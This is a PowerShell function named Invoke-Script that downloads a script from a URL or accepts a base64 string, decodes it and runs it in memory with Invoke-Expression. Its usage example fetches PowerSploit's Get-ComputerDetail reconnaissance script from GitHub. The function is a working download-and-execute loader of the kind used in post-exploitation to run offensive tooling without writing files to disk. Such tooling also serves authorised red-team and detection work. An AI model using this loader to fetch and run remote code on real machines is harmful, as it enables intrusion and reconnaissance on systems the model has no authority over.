Function Invoke-Script {
    <#
    .SYNOPSIS
        Loads a PowerShell script either from a URL or as a base64-encoded string, imports it as a function, and executes it with optional parameters.

    .PARAMETER EncodedScript
        Base64-encoded PowerShell script.

    .PARAMETER ScriptUrl
        URL to download a PowerShell script from.

    .PARAMETER FunctionCommand
        The function command to run after the script is loaded, e.g., 'Get-ComputerDetail -ToString'.

    .EXAMPLE
        Invoke-Script -ScriptUrl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetail.ps1" -FunctionCommand "Get-ComputerDetail -ToString"

    .EXAMPLE
        Invoke-Script -EncodedScript "base64_string" -FunctionCommand "Get-ComputerDetail -ToString"
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [string]$EncodedScript,

        [Parameter(Mandatory = $false)]
        [string]$ScriptUrl,

        [Parameter(Mandatory = $true)]
        [string]$FunctionCommand
    )

    try {
        if ($ScriptUrl) {
            $webClient = New-Object System.Net.WebClient
            $scriptContent = $webClient.DownloadString($ScriptUrl)

            $scriptBytes = [System.Text.Encoding]::UTF8.GetBytes($scriptContent)
            $EncodedScript = [Convert]::ToBase64String($scriptBytes)
        }

        if ($EncodedScript) {
            $decodedScript = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedScript))

            Invoke-Expression $decodedScript
            $output = Invoke-Expression $FunctionCommand
            Write-Output $output
        } else {
            Write-Output "[!] No valid script provided (either as a URL or base64 encoded script)."
        }
    } catch {
        Write-Output "[!] Failed to download, decode, load, or execute the script: $_"
    }
}
